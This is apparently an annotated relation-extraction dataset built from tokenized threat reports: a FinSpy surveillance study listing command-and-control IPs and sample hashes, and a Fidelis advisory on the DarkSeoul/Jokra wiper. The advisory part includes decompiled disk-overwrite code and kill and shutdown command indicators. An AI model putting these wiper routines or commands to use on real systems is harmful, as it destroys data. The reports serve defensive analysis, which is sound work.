"as", "other", "efforts", "at", "concealment", "."], ["Moreover", ",", "discovery", "of", "a", "FinSpy", "command", "and", "control", "server", "in", "a", "given", "country", "is", "not", "a", "sufficient", "indicator", "to", "conclude", "the", "use", "of", "FinFisher", "by", "that", "country", "\u2019s", "law", "enforcement", "or", "intelligence", "agencies", "."], ["In", "some", "cases", ",", "servers", "were", "found", "running", "on", "facilities", "provided", "by", "commercial", "hosting", "providers", "that", "could", "have", "been", "purchased", "by", "actors", "from", "any", "country", "."], ["The", "table", "below", "shows", "the", "FinSpy", "servers", "detected", "in", "our", "latest", "scan", "."], ["We", "list", "the", "full", "IP", "address", "of", "servers", "that", "have", "been", "previously", "publicly", "revealed", "."], ["For", "active", "servers", "that", "have", "not", "been", "publicly", "revealed", ",", "we", "list", "the", "first", "two", "octets", "only", "."], ["Releasing", "complete", "IP", "addresses", "in", "the", "past", "has", "not", "proved", "useful", ",", "as", "the", "servers", "are", "quickly", "shut", "down", "and", "relocated", "."], ["IP", "Operator", "Routed", "to", "Country", "117.121.xxx.xxx", "GPLHost", "Australia", "77.69.181.162"], ["Batelco", "ADSL", "Service", "Bahrain", "180.211.xxx.xxx"], ["Telegraph", "&", "Telephone", "Board", "Bangladesh", "168.144.xxx.xxx", "Softcom", ",", "Inc.", "Canada", "168.144.xxx.xxx", "Softcom", ",", "Inc.", "Canada", "217.16.xxx.xxx", "PIPNI", "VPS", "Czech", "Republic", "217.146.xxx.xxx", "Zone", "Media", "UVS", "/", "Nodes", "Estonia", "213.55.99.74", "Ethio", "Telecom", "Estonia", "80.156.xxx.xxx", "Gamma", "International", "GmbH", "Germany", "37.200.xxx.xxx", "JiffyBox", "Servers", "Germany", "5", "Number", "15", "\u2013", "March", "2013", "178.77.xxx.xxx"], ["HostEurope", "GmbH", "Germany", "119.18.xxx.xxx", "HostGator", "India", "119.18.xxx.xxx", "HostGator"], ["India", "118.97.xxx.xxx", "PT", "Telkom", "Indonesia", "118.97.xxx.xxx", "PT", "Telkom", "Indonesia", "103.28.xxx.xxx", "PT", "Matrixnet", "Global", "Indonesia", "112.78.143.34", "Biznet", "ISP", "Indonesia", "112.78.143.26", "Biznet", "ISP", "Indonesia", "117.121.xxx.xxx", "GPLHost", "Malaysia", "187.188.xxx.xxx", "Iusacell", "PCS", "Mexico", "201.122.xxx.xxx", "UniNet", "Mexico", "164.138.xxx.xxx", "Tilaa", "Netherlands", "164.138.28.2", "Tilaa", "Netherlands", "78.100.57.165", "Qtel", "\u2013", "Government", "Relations", "Qatar", "195.178.xxx.xxx", "Tri.d.o.o", "/", "Telekom", "Srbija", "Serbia", "117.121.xxx.xxx", "GPLHost", "Singapore", "217.174.229.82", "Ministry", "of", "Communications", "Turkmenistan", "72.22.xxx.xxx", "iPower", ",", "Inc.", "United", "States", "166.143.xxx.xxx", "Verizon", "Wireless", "United", "States", "117.121.xxx.xxx", "GPLHost", "United", "States", "117.121.xxx.xxx", "GPLHost", "United", "States", "117.121.xxx.xxx", "GPLHost", "United", "States", "117.121.xxx.xxx", "GPLHost", "United", "States", "183.91.xxx.xxx", "CMC", "Telecom", "Infrastructure", "Company", "Vietnam", "6", "Number", "15", "\u2013", "March", "2013"], ["Several", "of", "these", "findings", "are", "especially", "noteworthy", ":", "\uf0b7", "Eight", "servers", "are", "hosted", "by", "provider", "GPLHost", "in", "various", "countries", "(", "Singapore", ",", "Malaysia", ",", "Australia", ",", "US", ")", "."], ["However", ",", "we", "observed", "only", "six", "of", "these", "servers", "active", "at", "any", "given", "time", ",", "suggesting", "that", "some", "IP", "addresses", "may", "have", "changed", "during", "our", "scans", "."], ["\uf0b7", "A", "server", "identified", "in", "Germany", "has", "the", "registrant", "\u201c", "Gamma", "International", "GmbH", ",", "\u201d", "and", "the", "contact", "person", "is", "listed", "as", "\u201c", "Martin", "Muench", ".", "\u201d"], ["\uf0b7"], ["There", "is", "a", "FinSpy", "server", "in", "an", "IP", "range", "registered", "to", "\u201c", "Verizon", "Wireless", ".", "\u201d"], ["Verizon", "Wireless", "sells", "ranges", "of", "IP", "addresses", "to", "corporate", "customers", ",", "so", "this", "is", "not", "necessarily", "an", "indication", "that", "Verizon", "Wireless", "itself", "is", "operating", "the", "server", ",", "or", "that", "Verizon", "Wireless", "customers", "are", "being", "spied", "on", "."], ["\uf0b7", "A", "server", "in", "Qatar", "that", "was", "previously", "detected", "by", "Rapid7", "seems", "to", "be", "back", "online", "after", "being", "unresponsive", "during", "the", "last", "round", "of", "our", "scanning", "."], ["The", "server", "is", "located", "in", "a", "range", "of", "16", "addresses", "registered", "to", "\u201c", "Qtel", "\u2013", "Corporate", "accounts", "\u2013", "Government", "Relations", ".", "\u201d"], ["The", "same", "block", "of", "16", "addresses", "also", "contains", "the", "website", "http://qhotels.gov.qa/.", "3", "."], ["ETHIOPIA", "AND", "VIETNAM", ":", "IN", "-", "DEPTH", "DISCUSSION", "OF", "NEW", "SAMPLES", "3.1", "FinSpy", "in", "Ethiopia"], ["We", "analyzed", "a", "recently", "acquired", "malware", "sample", "and", "identified", "it", "as", "FinSpy", "."], ["The", "malware", "uses", "images", "of", "members", "of", "the", "Ethiopian", "opposition", "group", ",", "Ginbot", "7", ",", "as", "bait", "."], ["The", "malware", "communicates", "with", "a", "FinSpy", "Command", "&", "Control", "server", "in", "Ethiopia", ",", "which", "was", "first", "identified", "by", "Rapid7", "in", "August", "2012", "."], ["The", "server", "has", "been", "detected", "in", "every", "round", "of", "scanning", ",", "and", "remains", "operational", "at", "the", "time", "of", "this", "writing", "."], ["It", "can", "be", "found", "in", "the", "following", "address", "block", "run", "by", "Ethio", "Telecom", ",", "Ethiopia", "\u2019s", "stateowned", "telecommunications", "provider", ":", "IP", ":", "213.55.99.74", "route", ":", "213.55.99.0/24"], ["descr", ":", "Ethio", "Telecom", "origin", ":", "AS24757", "mnt", "-", "by", ":", "ETC", "-", "MNT", "member", "-", "of", ":", "rs", "-", "ethiotelecom", "source", ":", "RIPE", "#", "Filtered", "7", "Number", "15", "\u2013", "March", "2013"], ["The", "server", "appears", "to", "be", "updated", "in", "a", "manner", "consistent", "with", "other", "servers", ",", "including", "servers", "in", "Bahrain", "and", "Turkmenistan", "."], ["MD5", "8ae2febe04102450fdbc26a38037c82b"], ["SHA-1", "1fd0a268086f8d13c6a3262d41cce13470886b09", "SHA-256", "ff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa", "The", "sample", "is", "similar", "to", "a", "previously", "analyzed", "sample", "of", "FinSpy", "malware", "sent", "to", "activists", "in", "Bahrain", "in", "2012", "."], ["Just", "like", "Bahraini", "samples", ",", "the", "malware", "relocates", "itself", "and", "drops", "a", "JPG", "image", "with", "the", "same", "filename", "as", "the", "sample", "when", "executed", "by", "an", "unsuspecting", "user", "."], ["This", "appears", "to", "be", "an", "attempt", "to", "trick", "the", "victim", "into", "believing", "the", "opened", "file", "is", "not", "malicious", "."], ["Here", "are", "a", "few", "key", "similarities", "between", "the", "samples", ":", "\uf0b7", "The", "PE", "timestamp", "\u201c", "2011", "-", "07", "-", "05", "08:25:31", "\u201d", "of", "the", "packer", "is", "exactly", "the", "same", "as", "the", "Bahraini", "sample", "."], ["\uf0b7", "The", "following", "string", "(", "found", "in", "a", "process", "infected", "with", "the", "malware", ")", ",", "self", "-", "identifies", "the", "malware", "and", "is", "similar", "to", "strings", "found", "in", "the", "Bahraini", "samples", ":", "\uf0b7", "\uf0b7"], ["The", "samples", "share", "the", "same", "Bootkit", ",", "SHA-256", ":", "ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2", "."], ["\uf0b7", "The", "samples", "share", "the", "same", "driverw.sys", "file", ",", "SHA-256", ":", "62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196", "."], ["8", "Number", "15", "\u2013", "March", "2013", "Figure", "2", "."], ["The", "image", "shown", "to", "the", "victim", "contains", "pictures", "of", "members", "of", "the", "Ginbot", "7", "Ethiopian", "opposition", "group"], ["In", "this", "case", "the", "picture", "contains", "photos", "of", "members", "of", "the", "Ethiopian", "opposition", "group", ",", "Ginbot", "7", "."], ["Controversially", ",", "Ginbot", "7", "was", "designated", "a", "terrorist", "group", "by", "the", "Ethiopian", "Government", "in", "2011", "."], ["The", "Committee", "to", "Protect", "Journalists", "(", "CPJ", ")", "and", "Human", "Rights", "Watch", "have", "both", "criticized", "this", "action", ",", "CPJ", "has", "pointed", "out", "that", "it", "is", "having", "a", "chilling", "effect", "on", "legitimate", "political", "reporting", "about", "the", "group", "and", "its", "leadership", "."], ["The", "existence", "of", "a", "FinSpy", "sample", "that", "contains", "Ethiopia", "-", "specific", "imagery", ",", "and", "that", "communicates", "with", "a", "stillactive", "command", "&", "control", "server", "in", "Ethiopia", "strongly", "suggests", "that", "the", "Ethiopian", "Government", "is", "using"], ["FinSpy", "."], ["9", "Number", "15", "\u2013", "March", "2013", "3.2", "FinSpy", "Mobile", "in", "Vietnam"], ["We", "recently", "obtained", "and", "analyzed", "a", "malware", "sample6", "and", "identified", "it", "as", "FinSpy", "Mobile", "for", "Android", "."], ["The", "sample", "communicates", "with", "a", "command", "&", "control", "server", "in", "Vietnam", ",", "and", "exfiltrates", "text", "messages", "to", "a", "Vietnamese", "telephone", "number", "."], ["The", "FinFisher", "suite", "includes", "mobile", "phone", "versions", "of", "FinSpy", "for", "all", "major", "platforms", "including", "iOS", ",", "Android", ",", "Windows", "Mobile", ",", "Symbian", "and", "Blackberry", "."], ["Its", "features", "are", "broadly", "similar", "to", "the", "PC", "version", "of", "FinSpy", "identified", "in", "Bahrain", ",", "but", "it", "also", "contains", "mobile", "-", "specific", "features", "such", "as", "GPS", "tracking", "and", "functionality", "for", "silent", "\u2018", "spy", "\u2019", "calls", "to", "snoop", "on", "conversations", "near", "the", "phone", "."], ["An", "in", "-", "depth", "analysis", "of", "the", "FinSpy", "Mobile", "suite", "of", "backdoors", "was", "provided", "in", "an", "earlier", "blog", "post", ":", "The", "Smartphone"], ["Who", "Loved", "Me", ":"], ["FinFisher", "Goes", "Mobile", "?"], ["MD5", "573ef0b7ff1dab2c3f785ee46c51a54f", "SHA-1", "d58d4f6ad3235610bafba677b762f3872b0f67cb", "SHA-256", "363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345"], ["The", "sample", "included", "a", "configuration", "file7", "that", "indicates", "available", "functionality", ",", "and", "the", "options", "that", "have", "been", "enabled", "by", "those", "deploying", "it", ":", "Figure", "3", "."], ["Image", "of", "a", "section", "of", "a", "configuration", "file", "for", "the", "FinSpy", "Mobile", "sample", "10", "Number", "15", "\u2013", "March", "2013"], ["Interestingly", ",", "the", "configuration", "file", "also", "specifies", "a", "Vietnamese", "phone", "number", "used", "for", "SMS", "based", "command", "and", "control", ":", "Section", "Type", ":", "TlvTypeConfigSMSPhoneNumber", "Section", "Data", ":", "\u201c", "+841257725403", "\u201d", "The", "command", "and", "control", "server", "is", "in", "a", "range", "provided", "by", "the", "CMC", "Telecom", "Infrastructure", "Company", "in", "Hanoi", ":"], ["IP", "Address", ":", "183.91.2.199", "inetnum", ":", "183.91.0.0", "\u2013", "183.91.9.255", "netname", ":", "FTTX", "-", "NET", "country", ":", "Vietnam", "address", ":", "CMC", "Telecom", "Infrastructure", "Company", "address", ":", "Tang", "3", ",", "16", "Lieu", "Giai", "str", ",", "Ba", "Dinh", ",", "Ha", "Noi"], ["This", "server", "was", "active", "until", "very", "recently", "and", "matched", "our", "signatures", "for", "a", "FinSpy", "command", "and", "control", "server", "."], ["Both", "the", "command", "&", "control", "server", "IP", "and", "the", "phone", "number", "used", "for", "text", "-", "message", "exfiltration", "are", "in", "Vietnam", "which", "indicates", "a", "domestic", "campaign", "."], ["This", "apparent", "FinSpy", "deployment", "in", "Vietnam", "is", "troubling", "in", "the", "context", "of", "recent", "threats", "against", "online", "free", "expression", "and", "activism", "."], ["In", "2012", ",", "Vietnam", "introduced", "new", "censorship", "laws", "amidst", "an", "ongoing", "harassment", ",", "intimidation", ",", "and", "detention", "campaign", "against", "of", "bloggers", "who", "spoke", "out", "against", "the", "regime", "."], ["This", "culminated", "in", "the", "trial", "of", "17", "bloggers", ",", "14", "of", "whom", "were", "recently", "convicted", "and", "sentenced", "to", "terms", "ranging", "from", "3", "to", "13", "years.8", "4", "."], ["BRIEF", "DISCUSSION", "OF", "FINDINGS"], ["Companies", "selling", "surveillance", "and", "intrusion", "software", "commonly", "claim", "that", "their", "tools", "are", "only", "used", "to", "track", "criminals", "and", "terrorists", "."], ["FinFisher", ",", "VUPEN", "and", "Hacking", "Team", "have", "all", "used", "similar", "language.9", "Yet", "a", "growing", "body", "of", "evidence", "suggests", "that", "these", "tools", "are", "regularly", "obtained", "by", "countries", "where", "dissenting", "political", "activity", "and", "speech", "is", "criminalized", "."], ["Our", "findings", "highlight", "the", "increasing", "dissonance", "between", "Gamma", "\u2019s", "public", "claims", "that", "FinSpy", "is", "used", "exclusively", "to", "track", "\u201c", "bad", "guys", "\u201d", "and", "the", "growing", "body", "of", "evidence", "suggesting", "that", "the", "tool", "has", "and", "continues", "to", "be", "used", "against", "opposition", "groups", "and", "human", "rights", "activists", "."], ["While", "our", "work", "highlights", "the", "human", "rights", "ramifications", "of", "the", "mis", "-", "use", "of", "this", "technology", ",", "it", "is", "clear", "that", "there", "are", "broader", "concerns", "."], ["A", "global", "and", "unregulated", "market", "for", "offensive", "digital", "tools", "potentially", "presents", "a", "11", "Number", "15", "\u2013", "March", "2013", "novel", "risk", "to", "both", "national", "and", "corporate", "cyber", "-", "security", "."], ["On", "March", "12th", ",", "US", "Director", "of", "National", "Intelligence", "James", "Clapper", "stated", "in", "his", "yearly", "congressional", "report", "on", "security", "threats", ":", "\u201c", "\u2026", "companies", "develop", "and", "sell", "professional", "-", "quality", "technologies", "to", "support", "cyberoperations", "\u2013", "often", "branding", "these", "tools", "as", "lawful", "-", "intercept", "or", "defensive", "security", "research", "products", "."], ["Foreign", "governments", "already", "use", "some", "of", "these", "tools", "to", "target", "U.S.", "systems", ".", "\u201d"], ["The", "unchecked", "global", "proliferation", "of", "products", "like", "FinFisher", "makes", "a", "strong", "case", "for", "policy", "debate", "about", "surveillance", "software", "and", "the", "commercialization", "of", "offensive", "cyber", "-", "capabilities", "."], ["Our", "latest", "findings", "give", "an", "updated", "look", "at", "the", "global", "proliferation", "of", "FinSpy", "."], ["We", "identified", "36", "active", "FinSpy", "command", "&", "control", "servers", ",", "including", "30", "previously", "-", "unknown", "servers", "."], ["Our", "list", "of", "servers", "is", "likely", "incomplete", ",", "as", "some", "FinSpy", "servers", "employ", "countermeasures", "to", "prevent", "detection", "."], ["Including", "servers", "discovered", "last", "year", ",", "we", "now", "count", "FinSpy", "servers", "in", "25", "countries", ",", "including", "countries", "with", "troubling", "human", "rights", "records", "."], ["This", "is", "indicative", "of", "a", "global", "trend", "towards", "the", "acquisition", "of", "offensive", "cyber", "-", "capabilities", "by", "non", "-", "democratic", "regimes", "from", "commercial", "Western", "companies", "."], ["The", "Vietnamese", "and", "Ethiopian", "FinSpy", "samples", "we", "identified", "warrant", "further", "investigation", ",", "especially", "given", "the", "poor", "human", "rights", "records", "of", "these", "countries", "."], ["The", "fact", "that", "the", "Ethiopian", "version", "of", "FinSpy", "uses", "images", "of", "opposition", "members", "as", "bait", "suggests", "it", "may", "be", "used", "for", "politically", "influenced", "surveillance", "activities", ",", "rather", "than", "strictly", "law", "enforcement", "purposes", "."], ["The", "Ethiopian", "sample", "is", "the", "second", "FinSpy", "sample", "we", "have", "discovered", "that", "communicates", "with", "a", "server", "we", "identified", "by", "scanning", "as", "a", "FinSpy", "command", "&", "control", "server", "."], ["This", "further", "validates", "our", "scanning", "results", ",", "and", "calls", "into", "question", "Gamma", "\u2019s", "claim", "that", "such", "servers", "are", "\u201c", "not", "\u2026", "from", "the", "FinFisher", "product", "line", "."], ["\u201d10", "Similarities", "between", "the", "Ethiopian", "sample", "and", "those", "used", "to", "target", "Bahraini", "activists", "also", "bring", "into", "question", "Gamma", "International", "\u2019s", "earlier", "claims", "that", "the", "Bahrain", "samples", "were", "stolen", "demonstration", "copies", "."], ["While", "the", "sale", "of", "such", "intrusion", "and", "surveillance", "software", "is", "largely", "unregulated", ",", "the", "issue", "has", "drawn", "increased", "high", "-", "level", "scrutiny", "."], ["In", "September", "of", "last", "year", ",", "the", "German", "foreign", "minister", ",", "Guido", "Westerwelle", ",", "called", "for", "an", "EU", "-", "wide", "ban", "on", "the", "export", "of", "such", "surveillance", "software", "to", "totalitarian", "states.11", "In", "a", "December", "2012", "interview", ",", "Marietje", "Schaake", "(", "MEP", ")", ",", "currently", "the", "rapporteur", "for", "the", "first", "EU", "strategy", "on", "digital", "freedom", "in", "foreign", "policy", ",", "stated", "that", "it", "was", "\u201c", "quite", "shocking", "\u201d", "that", "Europe", "companies", "continue", "to", "export", "repressive", "technologies", "to", "countries", "where", "the", "rule", "of", "law", "is", "in", "question.12"], ["We", "urge", "civil", "society", "groups", "and", "journalists", "to", "follow", "up", "on", "our", "findings", "within", "affected", "countries", "."], ["We", "also", "hope", "that", "our", "findings", "will", "provide", "valuable", "information", "to", "the", "ongoing", "technology", "and", "policy", "debate", "about", "surveillance", "software", "and", "the", "commercialisation", "of", "offensive", "cyber", "-", "capabilities", "."], ["12", "Number", "15", "\u2013", "March", "2013", "ACKNOWLEDGEMENTS"], ["We", "\u2019d", "like", "to", "thank", "Eva", "Galperin", "and", "the", "Electronic", "Frontier", "Foundation", "(", "EFF", ")", ",", "Privacy", "International", ",", "Bahrain", "Watch", ",", "and", "Drew", "Hintz", "."], ["MEDIA", "COVERAGE", "Media", "coverage", "of", "the", "report", "includes", "HuffingtonPost", "Canada", ",", "Salon", ",", "The", "Verge", ",", "Bloomberg", "Business", "Week", ",", "TheYoungTurks", "."], ["_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "FOOTNOTES", "1", "https://www.gammagroup.com/"], ["Software", "Meant", "to", "Fight", "Crime", "Is", "Used", "to", "Spy", "on", "Dissidents", ",", "http://goo.gl/GDRMe", ",", "New", "York", "Times", ",", "August", "31", ",", "2012", ",", "Page", "A1", "Print", "edition", "."], ["3", "Cyber", "Attacks", "on", "Activists", "Traced", "to", "FinFisher", "Spyware", "of", "Gamma", ",", "http://goo.gl/nJH7o", ",", "Bloomberg", ",", "July", "25", ",", "2012", "4", "http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/", "5", "http://www.sueddeutsche.de/digital/finfisher-entwickler-gamma-spam-vom-staat-1.1595253"], ["6"], ["This", "sample", "has", "also", "been", "discussed", "by", "Denis", "Maslennikov", "from", "Kasperksy", "in", "his", "analyses", "of", "FinSpy", "Mobile"], ["\u2013", "https://www.securelist.com/en/analysis/204792283/Mobile_Malware_Evolution_Part_6", "7", "Configuration", "parsed", "with", "a", "tool", "written", "by", "Josh", "Grunzweig", "of", "Spider", "Labs", "\u2013", "http://blog.spiderlabs.com/2012/09/finspy-mobile-configuration-and-insight.html", "8", "https://www.eff.org/deeplinks/2013/01/bloggers-trial-vietnam-are-part-ongoing-crackdown-free-expression", "9"], ["https://www.securityweek.com/podcast-vupen-ceo-chaouki-bekrar-addresses-zero-day-marketplacecontroversy-cansecwest", "10", "http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/", "11", "http://www.guardian.co.uk/uk/2012/nov/28/offshore-company-directors-military-intelligence", "12", "http://www.vieuws.eu/foreign-affairs/digital-freedoms-marietje-schaake-mep-alde/", "2", "13"]]}, {"vertexSet": [[{"name": "Fidelis", "pos": [4, 5], "sent_id": 0, "type": "Organization"}], [{"name": "Darkseoul", "pos": [9, 10], "sent_id": 0, "type": "Malware"}], [{"name": "Jokra", "pos": [11, 12], "sent_id": 0, "type": "Malware"}], [{"name": "March 21, 2013", "pos": [15, 19], "sent_id": 0, "type": "Time"}], [{"name": "South Korean broadcasting and banking infrastructure", "pos": [8, 14], "sent_id": 4, "type": "ExploitTargetObject"}], [{"name": "Saudi Aramco", "pos": [15, 17], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Shamoon", "pos": [19, 20], "sent_id": 5, "type": "Malware"}], [{"name": "Shamoon", "pos": [0, 1], "sent_id": 6, "type": "Malware"}], [{"name": "HASTATI", "pos": [17, 18], "sent_id": 11, "type": "Indicator"}], [{"name": "PR!NCPES", "pos": [21, 22], "sent_id": 11, "type": "Indicator"}], [{"name": "Shamoon", "pos": [18, 19], "sent_id": 12, "type": "Malware"}], [{"name": "DarkSeoul", "pos": [6, 7], "sent_id": 17, "type": "Malware"}], [{"name": "Jokra", "pos": [10, 11], "sent_id": 17, "type": "Malware"}], [{"name": "239ed75323.exe", "pos": [0, 1], "sent_id": 19, "type": "Malware"}], [{"name": "mb_join.exe", "pos": [2, 3], "sent_id": 19, "type": "Malware"}], [{"name": "5fcd6e1dace6b0599429d913850f0364", "pos": [4, 5], "sent_id": 19, "type": "MD5"}], [{"name": "0a8032cd6b4a710b1771a080fa09fb87", "pos": [0, 1], "sent_id": 20, "type": "MD5"}], [{"name": "Windows XP", "pos": [12, 14], "sent_id": 32, "type": "System"}], [{"name": "taskkill /F /IM pasvc.exe", "pos": [12, 16], "sent_id": 54, "type": "Indicator"}], [{"name": "taskkill /F /IM Clisvc.exe", "pos": [18, 22], "sent_id": 54, "type": "Indicator"}], [{"name": "shutdown -r -t 0", "pos": [24, 28], "sent_id": 54, "type": "Indicator"}], [{"name": "ViRobot ISMS", "pos": [6, 8], "sent_id": 63, "type": "Software"}], [{"name": "HAURI Inc", "pos": [0, 2], "sent_id": 64, "type": "Organization"}], [{"name": "Shamoon", "pos": [12, 13], "sent_id": 76, "type": "Malware"}], [{"name": "Fidelis XPS", "pos": [3, 5], "sent_id": 94, "type": "Software"}], [{"name": "DarkSeoul", "pos": [8, 9], "sent_id": 94, "type": "Malware"}], [{"name": "Jokra", "pos": [10, 11], "sent_id": 94, "type": "Malware"}], [{"name": "Trojan.Win32.EraseMBR.b", "pos": [19, 22], "sent_id": 94, "type": "TrojanHorse"}]], "labels": [{"r": "P21", "h": 8, "t": 11, "evidence": [11, 17]}, {"r": "P21", "h": 9, "t": 12, "evidence": [11, 17]}, {"r": "P21", "h": 15, "t": 13, "evidence": [19]}, {"r": "P21", "h": 16, "t": 14, "evidence": [19, 20]}, {"r": "P17", "h": 22, "t": 21, "evidence": [63, 64]}], "title": "201303FidelisDarkSeoulJokra", "sents": [["www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys", "+1800.652.4020", "Fidelis", "Threat", "Advisory", "#", "1008", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery", "March", "21", ",", "2013"], ["Document", "Status", ":"], ["Last", "Revised", ":", "FINAL"], ["2013", "-", "03", "-", "21"], ["A", "recent", "cyber", "-", "attack", "reported", "within", "the", "South", "Korean", "broadcasting", "and", "banking", "infrastructure", "reportedly", "brought", "down", "over", "35,000", "systems", "."], ["This", "attack", "has", "drawn", "comparisons", "in", "intent", "and", "method", "to", "the", "recent", "wiping", "attack", "against", "Saudi", "Aramco", "by", "the", "Shamoon", "malware", "."], ["Shamoon", "has", "been", "covered", "extensively", "by", "the", "community", ",", "and", "was", "covered", "in", "Fidelis", "Threat", "Advisory", "#", "1007", "."], ["Naturally", "our", "curiosity", "was", "peaked", "and", "we", "acquired", "samples", "of", "the", "malware", "and", "started", "analysis", "."], ["The", "initial", "analysis", "has", "been", "posted", "on", "the", "Fidelis", "Threat", "Geek", "blog", "and", "will", "be", "expanded", "upon", "in", "this", "advisory", "."], ["This", "write", "-", "up", "will", "focus", "on", "the", "wiper", "malware", "used", "and", "the", "recovery", "techniques", "that", "are", "possible", "."], ["From", "preliminary", "analysis", "it", "is", "known", "that", "the", "malware", "will", "overwrite", "the", "Master", "Boot", "Record", "(", "MBR", ")", "and", "Volume", "Boot", "Record", "(", "VBR", ")", "."], ["The", "records", "and", "files", "overwritten", "by", "the", "malware", "so", "far", "have", "been", "wiped", "with", "patterns", "of", "'", "HASTATI", "'", "or", "'", "PR!NCPES", "\u2019", "."], ["The", "malware", "samples", "that", "have", "been", "analyzed", "by", "our", "team", "are", "different", "in", "code", "and", "function", "from", "the", "Shamoon", "malware", "."], ["However", ",", "by", "using", "the", "same", "recovery", "methods", "found", "in", "advisory"], ["#", "1007", "the", "files", "and", "data", "are", "indeed", "recoverable", "."], ["Wiper", "Malware", "Overview"], ["Two", "malware", "samples", "obtained", "were", "used", "in", "the", "analysis", "."], ["The", "malware", "has", "been", "named", "'", "DarkSeoul", "'", "and", "'", "Jokra", "'", "by", "the", "community", "."], ["Our", "samples", "have", "been", "touched", "on", "in", "our", "blog", "entry", "and", "other", "samples", "have", "been", "covered", "in", "blogs", "around", "the", "community", "."], ["239ed75323.exe", ":", "mb_join.exe", ":", "5fcd6e1dace6b0599429d913850f0364"], ["0a8032cd6b4a710b1771a080fa09fb87", "Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", "."], ["This", "document", "can", "not", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine", "-", "readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written", "approval", "of", "Fidelis", "Security", "Systems", ","], ["Inc."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "Security", "Systems", ",", "Inc.", "makes", "no", "guarantee", "that", "the", "information", "contained", "herein", "is", "error", "free", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems", "Threat", "Advisory", "#", "1008"], ["Page", "1", "of", "5", "Rev.", "2013", "-", "02", "-", "21", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1800.652.4020"], ["The", "malware", "gains", "disk", "access", "by", "opening", "the", "physical", "drive", "as", "a", "file", "."], ["Disk", "Access", "(", "Func", "00401d55", "):", "sprintf(filename_str", ",", "\"", "\\\\.\\PhysicalDrive%d", "\"", ",", "0", ")"], ["hFile", "=", "CreateFileA(filename_str", ",", "GENERIC_READ", "|", "GENERIC_WRITE", ",", "FILE_SHARE_READ", "|", "FILE_SHARE_WRITE", ",", "NULL", ",", "OPEN_EXISTING", ",", "NULL", ")"], ["Example", "of", "the", "wiper", "opening", "the", "drive", "as", "a", "file", "."], ["The", "first", "section", "that", "the", "malware", "overwrites", "is", "located", "at", "0x7000", "."], ["This", "is", "sector", "56", "and", "is", "normally", "the", "VBR", "location", "of", "a", "Windows", "XP", "system", "."], ["It", "continues", "the", "pattern", "of", "'", "HASTATI", "'", "or", "'", "PR!NCPES", "\u2019", "'", "for", "102,400d", "bytes", "."], ["Wiper", "Selection", "(", "Func", "00402079", "):", "and", "[", "local.1", "]", ",", "0", ";", "(", "local.1->\"PR!NCPES", "\"", ")", "mov", "esi,[arg.2", "]", ";", "arg.2", "=", "0x38", "on", "first", "call", "eax=0", "shld", "eax", ",", "esi,9", "mov", "edi,[arg.1", "]", "mov"], ["[", "arg.2", "]", ",", "eax", "lea", "eax", ","], ["[", "arg.2", "]", "shl", "esi,9", "SetFilePointer(hFile", ",", "esi", ",", "eax", ",", "FILE_BEGIN", ")", "//", "on", "first", "call", "--", "0x009efab8:0x00007000", "WriteFile(hFile", ",", "&", "arg.3", ",", "512", ",", "&", "local.1", ",", "NULL", ")"], ["Example", "of", "how", "the", "wiper", "selected", "the", "location", "to", "overwrite", "on", "the", "first", "call", "."], ["If", "this", "is", "hardcoded", "for", "0x7000", "then", "it", "will", "not", "wipe", "the", "VBR", "of", "any", "systems", "after", "and", "including", "Vista", ",", "as", "those", "VBR", "locations", "are", "in", "different", "areas", "."], ["During", "testing", "both", "malware", "samples", "were", "executed", "in", "a", "Windows", "7", "VM", "."], ["Neither", "wiped", "the", "MBR", "or", "the", "VBR", "\u2014", "they", "only", "overwrote", "files", "within", "the", "file", "system", "\u2014", "but", "the", "system", "was", "n't", "prevented", "from", "starting", "up", "."], ["The", "malware", "writes", "a", "512", "-", "byte", "pattern", "to", "the", "disk", "in", "XP", "and", "a", "1023", "byte", "pattern", "in", "Windows", "7", "."], ["Example", "of", "the", "loop", "responsible", "for", "overwriting", "the", "disk", "and", "files", "."], ["As", "observed", "during", "a", "debugging", "session", "the", "following", "screenshot", "shows", "one", "of", "the", "512", "-", "byte", "patterns", "it", "writes", "to", "disk", ":", "Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems", "Threat", "Advisory", "#", "1008"], ["Page", "2", "of", "5", "Rev.", "2013", "-", "02", "-", "21", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys", "+1800.652.4020", "Example", "of", "overwritten", "disk"], ["The", "malware", "will", "create", "new", "threads", "for", "each", "physical", "drive", "found", "on", "the", "affected", "system", "."], ["It", "enumerates", "and", "tries", "to", "find", "PhysicalDrive[0", "-", "9", "]", "."], ["The", "malware", "makes", "distinctions", "based", "on", "what", "type", "of", "drive", "is", "detected", ",", "such", "as", "fixed", "or", "removable", "devices", "."], ["As", "long", "as", "the", "drive", "is", "fixed", "a", "new", "thread", "is", "created", "."], ["Thread", "1", "(", "Func", "00401aa0", "):", "call", "func_00401d55", "strcpy(drive_path", ",", "\"", "B:\\", "\"", ")", "..."], ["if", "(", "GetDriveType(drive_path", ")"], ["=", 